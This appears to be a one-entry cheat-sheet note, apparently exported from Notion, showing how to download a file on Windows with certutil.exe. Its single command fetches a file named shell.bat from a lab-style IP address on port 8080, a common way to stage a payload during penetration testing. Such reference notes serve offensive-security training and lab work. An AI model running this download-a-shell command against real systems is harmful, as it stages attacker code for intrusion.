# certutil,exe: Download File

OS: Windows
Description: Download a file with certutil
Security Domains: File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

```jsx
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```